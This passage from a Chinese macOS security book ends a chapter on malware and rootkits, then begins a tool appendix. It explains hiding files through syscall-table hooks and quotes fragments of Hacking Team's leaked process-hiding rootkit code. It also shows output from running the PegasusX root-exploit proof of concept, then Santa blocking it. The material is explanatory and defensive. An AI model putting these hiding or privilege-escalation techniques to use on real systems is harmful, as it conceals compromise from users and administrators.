48104/0x24f63f: sysctl(0x7FFF5DF84AC0, 0x4, 0x7FFF5DF84838) = 00
48104/0x24f63f: csops(0xBBE8, 0x7, 0x7FFF5DF83FF0) = 00
48104/0x24f63f: proc_info(0x2, 0xBBE8, 0x11) = 560
48104/0x24f63f: getrlimit(0x1008, 0x7FFF5DF85B98, 0x11) = 00
48104/0x24f63f: open_nocancel("/usr/share/locale/UTF-8/LC_CTYPE\0", 0x0, 0x1B6) = 30
48104/0x24f63f: fstat64(0x3, 0x7FFF5DF85D18, 0x1B6) = 00
48104/0x24f63f: fstat64(0x3, 0x7FFF5DF85B08, 0x1B6) = 00
48104/0x24f63f: lseek(0x3, 0x0, 0x1) = 00
48104/0x24f63f: lseek(0x3, 0x0, 0x0) = 00
48104/0x24f63f: read_nocancel(0x3, "RuneMagAUTF-8\0", 0x1000) = 40960
48104/0x24f63f: read_nocancel(0x3, "\\0", 0x1000) = 40960
48104/0x24f63f: close_nocancel(0x3) = 00
48104/0x24f63f: ioctl(0x1, 0x4004667A, 0x7FFF5DF8625C) = 00
48104/0x24f63f: ioctl(0x1, 0x40087468, 0x7FFF5DF86900) = 00
48104/0x24f63f: getuid(0x1, 0x40087468, 0x7FFF5DF86900) = 00
48104/0x24f63f: stat64("/Applications/\0", 0x7FFF5DF86178, 0x7FFF5DF86900) = 00
48104/0x24f63f: open_nocancel(".\0", 0x0, 0x0) = 30
48104/0x24f63f: fchdir(0x3, 0x0, 0x0) = 00
48104/0x24f63f: open_nocancel("/Applications/\0", 0x1100004, 0x101C91A00) = 40
48104/0x24f63f: sysctl(0x7FFF5DF85858, 0x2, 0x7FFF78121E00) = 00
48104/0x24f63f: fstatfs64(0x4, 0x7FFF5DF858E8, 0x7FFF78121E00) = 00
48104/0x24f63f: getdirentries64(0x4, 0x7FD174801000, 0x1000) = 40960
48104/0x24f63f: write_nocancel(0x1, "Numbers.app\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t

从系统调用的路径上看，执行顺序一目了然：stat64()→open_nocancel()→fchdir()→systl()→fstatfs64()→getdirentries64()→close_nocancel()。了解系统调用功能的读者应该可以看出，Hook需要关注的点是getdirentries64()。只需要在内核层Hook住该系统调用，将结果中的文件名从目录链表中去除就可以达到隐藏文件的目的了。getdirentries64()是新的列举文件功能的系统调用，较低版本使用的是getdirentries()。bash使用的就是该系统调用，使用同样的分析方法可以得知，Finder使用的是getdirentriesattr()。在具体实现Rootkit时，为了做到彻底地隐藏文件，这几个系统调用都需要Hook掉。系统调用在系统中像表一样以线性结构存于内核中，被称为“系统调用表”。该表早期版本在内核中是导出的，可以直接引用，做Hook就简单得多。较高版本的系统没有导出系统调用表，要想找到它需要通过其他手段，典型的有基于特征的内存暴力搜索。找到系统调用表后，将表中具体调用的实现指向自己定义的指针即可完成Hook。

#### 12.4.2 进程隐藏

系统会为所有正在运行的进程维护一份进程列表。它是一个链表结构，要想做到进程隐藏，就需要将指定的进程从该链表中去除。系统中每个进程的上下文信息都保存在proc数据结构中，该结构在用户空间的结构定义位于/usr/include/sys/proc.h文件，内核中的定义位于xnu_src/BSD/sys/proc_internal.h文件。实现进程隐藏需要了解proc结构的各项字段的含义。下面是知名的黑客组织Hacking Team泄露的Rootkit进程隐藏相关的代码片段：

int hide_proc(proc_t p, char *username, int backdoor_index)
{
    proc_t proc = NULL;
    //int_index = 0;

#ifdef DEBUG
    printf("[MCHOOK] Hiding proc: %d\n", p->p_pid);
#endif

.....
#ifdef DEBUG
    printf("[MCHOOK] Af-hiding tasks count: %d\n", *i_tasks_count);
#endif

i_proc_list_lock();

// Unlinking proc
//
LIST_FOREACH(proc, i_allproc, p_list) {
    if (proc->p_pid == p->p_pid) {
        #ifdef DEBUG
            printf("[MCHOOK] pid %d found\n", p->p_pid);
        #endif
        i_proc_lock(proc);
    }
}

LIST_REMOVE(proc, p_list);
LIST_REMOVE(proc, p_hash);

i_proc_unlock(proc);
//(*i_nprocs)--;

#ifdef DEBUG
    printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif

g_reg_backdoors[backdoor_index]->is_proc_hidden = 1;
break;
}

//i_proc_unlock(proc);
}

i_proc_list_unlock();

if (g_reg_backdoors[backdoor_index]->is_task_hidden == 1 || g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
    #ifdef DEBUG
        printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[backdoor_index]->is_task_hidden);
        printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[backdoor_index]->is_proc_hidden);
    #endif
    g_reg_backdoors[backdoor_index]->is_hidden = 1;
}

return 0;
}

LIST_FOREACH列举进程链表，获取每一项的proc结构，找到需要Hook的进程后，ST_REMOVE将它从进程链表和进程Hash表中删除。

#### 12.4.3 内核模块隐藏

内核模块隐藏与进程隐藏类似。内核模块也以链表的形式进行存储，每个内核模块使用一个kmod_info数据结构表示。典型的内核模块隐藏方法是找到内核模块链表，将指定的模块从链表中去除。这在低版本的系统中有效，在高版本中还需要处理一个未导出的内核结构sLoadedKexts。具体细节此处不再展开，可以参看Hacking Team泄露的Rootkit相关的源代码，或者查看TSRC上编写的技术分析。

苹果系统上网络端口隐藏的Rootkit目前比较少见，而创建隐藏用户除了需要在登录界面与System Preferences→Users & Groups中隐藏外，还需要在命令行下的dsci.list /Users与dscacheutil -q user中隐藏，有兴趣的读者可以自行研究如何实现。

#### 12.4.4 Root 提权

最后，不得不说的是Root提权。通过使用未公开的0Day漏洞或者已经公开的漏洞Poc代码，用户空间的程序可以在最新或一些未打过最新补丁的系统中直接获取Root权限，如知名的三叉戟漏洞。同时影响着iOS与macOS系统，在macOS Sierra 10.12系统的上一个版本10.11.6中，直接运行漏洞的Poc代码PegasusX $ ^{①} $即可获取Root权限，如下所示：

$ cd PegasusX/
$./pwn
(i) Crafting dictionary...
(i) Leaking kslide...
(+) Dictionary is valid! Spawning user client...
(+) UC successfully spawned! Leaking bytes...
(+) Done! Calculating KASLR slide...
(i) KASLR slide is 0x0000001fc00000
(i) Building ROP chain...
(+) All done! Triggering the bug!
(+) got root!
bash-3.2#

Rootkit的安装除了在用户干预的情况下通过手动加载内核模块完成之外，商业级的Rootkit更多时候是通过获取本地Root提权后安装的。因为这种方式更加智能，且更加隐蔽。打开一个文档，浏览一个网页，或者执行某个程序，Rootkit就被巧无声息地安装进了系统。之后，用户的所有行为就可能被远程监控了。Rootkit威力如此强大，想想就是一件很可怕的事情，防治Rootkit就变得尤为重要。

所以，要从正规的渠道获取软件。App Store是首选，其次是从软件开发商的官网下载。如果因为一些其他原因，不得不下载第三方的软件，就需要多留个心眼。此时，主动监控软件就派上用场了。推荐Google开源的一款工具Santa $ ^{②} $。在安装了Santa的机器上，运行上面的提权Poc代码，会直接拦截下来，如下所示：

$./pwn
-bash: ./pwn: Operation not permitted
Santa
The following application has been blocked from executing because it has been deemed malicious.
Path: /Users/macbook/git/PegasusX/pwn
Identifier: 4c949fa90ab37db3e3680e54791f5fd62f8b958d0f5e0838449d0c3ed1553d3e
Parent: bash (1253)

同时会弹出提示窗口让用户操作，对于该Poc，Santa是直接拒绝运行的！对Santa有兴趣的读者，可以阅读它的源代码来了解它的实现原理。

### 12.5 本章小结

本章主要介绍了在macOS系统上恶意软件与Rootkit用到的技术方案及其实现原理。掌握了这些内容后，分析常见的恶意软件就会手到擒来了。

至此，全书就告一段落了。希望读者阅读完本书后会有所收获。最后，由于笔者的技术与时间有限，书中错误再所难免。如果读者在阅读的过程中，有什么疑问、意见或建议，可以发邮件到fei_cong@hotmail.com与我进行交流。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>性质</td><td style='text-align: center; word-wrap: break-word;'>跨平台</td><td style='text-align: center; word-wrap: break-word;'>简介</td><td style='text-align: center; word-wrap: break-word;'>下载地址</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Xcode</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>App Store</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HT Editor</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>十六进制编辑器</td><td style='text-align: center; word-wrap: break-word;'>http://hte.sourceforge.net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HomeBrew</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>程序包管理</td><td style='text-align: center; word-wrap: break-word;'>http://brew.sh/ (https://github.com/Homebrew/brew)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CakeBrew</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>程序包管理</td><td style='text-align: center; word-wrap: break-word;'>https://www.cakebrew.com (https://github.com/brunophilipe/Cakebrew)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Macports</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>程序包管理</td><td style='text-align: center; word-wrap: break-word;'>https://www.macports.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pcileech</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>DMA攻击工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/ufrisk/pcileech</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>stfusip</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>Rootless绕过工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/jndok/stfusip</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>rootfool</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>Rootless绕过工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/gdbinit/rootfool</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>disable_sip</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>Rootless绕过工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/univ-of-utah-marriott-library-apple/disable_sip</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Qt Creator</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>https://www.qt.io</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Xamarin Studio</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>https://www.xamarin.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>AppCode</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>https://www.jetbrains.com/objc</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Visual Studio Code</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>https://code.visualstudio.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>010 Editor</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>文本与二进编编辑工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.sweetscape.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Synalyze It!</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文本与二进编编辑工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.synalysis.net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>BBEditor</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文本编辑工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.barebones.com/products/bbedit</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CotEditor</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文本编辑工具</td><td style='text-align: center; word-wrap: break-word;'>App Store (https://github.com/coteditor/CotEditor)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UltraEdit</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>文本编辑工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.ultraedit.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>atom</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>文本编辑工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/atom/atom</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>iTerm</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>终端，可用来代替系统的Console</td><td style='text-align: center; word-wrap: break-word;'>https://iterm2.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Google Chrome</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>Google出品的跨平台浏览器</td><td style='text-align: center; word-wrap: break-word;'>https://www.google.com/chrome</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>性质</td><td style='text-align: center; word-wrap: break-word;'>跨平台</td><td style='text-align: center; word-wrap: break-word;'>简介</td><td style='text-align: center; word-wrap: break-word;'>下载地址</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IDA Pro</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>反汇编工具</td><td style='text-align: center; word-wrap: break-word;'>https://www.hex-rays.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Hopper Disassembler</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>反汇编工具</td><td style='text-align: center; word-wrap: break-word;'>http://hopperapp.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Radare2</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>反汇编工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/radare/radare2</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>iHex</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>十六进制编辑器</td><td style='text-align: center; word-wrap: break-word;'>App Store</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Hex Fiend</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>十六进制编辑器</td><td style='text-align: center; word-wrap: break-word;'>http://ridiculousfish.com/hexfiend</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Alfred</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>系统辅助，执行快速打开操作</td><td style='text-align: center; word-wrap: break-word;'>App Store</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CMake</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>自动软件构建工具</td><td style='text-align: center; word-wrap: break-word;'>http://cmake.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Dash</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>开发文档搜索</td><td style='text-align: center; word-wrap: break-word;'>App Store</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Xamarin Studio</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>C#软件开发IDE</td><td style='text-align: center; word-wrap: break-word;'>https://www.xamarin.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>infer</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>静态分析工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/facebook/infer</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>patchdiff2</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>IDA Pro插件</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/alexander-pick/patchdiff2_ida6</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ida patcher</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>IDA Pro插件</td><td style='text-align: center; word-wrap: break-word;'>http://thesprawl.org/projects/ida-patcher</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Keypatch</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>IDA Pro插件</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/keystone-engine/keypatch</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>hopper-swift-demangle</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>Hopper插件</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/keith/hopper-swift-demangle</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Suspicious Package</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文件预览</td><td style='text-align: center; word-wrap: break-word;'>http://www.mothersruin.com/software/SuspiciousPackage</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MachOView</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO文件查看器</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/gdbinit/MachOView</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>NibUnlocker</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>nib解密工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.charlessoft.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>insert_dylib</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO静态注入工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/Tyilo/insert_dylib</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Chisel</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>LLDB调试脚本命令</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/facebook/chisel</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>yololib</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO静态注入工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/KJCracks/yololib</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>osxinj</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO动态注入工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/scen/osxinj</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>optool</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO管理工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/alexzielenski/optool</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>unsigned</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO签名去除工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/steakknife/unsigned</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>fishhook</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO Hook</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/facebook/fishhook</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OsxAppPatcher</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO Hook</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/malokch/OsxAppPatcher</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CaptainHook</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>MachO Hook</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/rpetrich/CaptainHook</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ZKSwizzle</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO Hook</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/alexzielenski/ZKSwizzle</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Frida</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>通用Hook框架</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/frida/frida</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cycript</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>通用Hook框架</td><td style='text-align: center; word-wrap: break-word;'>http://www.cycript.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Affinic Debugger</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>gdb/lldb调试器前端</td><td style='text-align: center; word-wrap: break-word;'>http://www.affinic.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>disable_aslr</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO ASLR关闭工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/sskaje/disable_aslr</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DropDMG</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>DMG制作管理工具</td><td style='text-align: center; word-wrap: break-word;'>http://c-command.com/dropdmg</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Icebreg</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>DMG制作管理工具</td><td style='text-align: center; word-wrap: break-word;'>http://s.sudre.free.fr/Software/Iceberg.html</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>性质</td><td style='text-align: center; word-wrap: break-word;'>跨平台</td><td style='text-align: center; word-wrap: break-word;'>简介</td><td style='text-align: center; word-wrap: break-word;'>下载地址</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>createOSXinstallPkg</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>PKG制作</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/munki/createOSXinstallPkg</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Luggage</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>PKG/DMG制作</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/unixorn/luggage</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UninstallPKG</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>PKG卸载工具</td><td style='text-align: center; word-wrap: break-word;'>https://www.corecode.io/uninstallpkg/</td></tr><tr><td style='text-align: center; word-wrap: 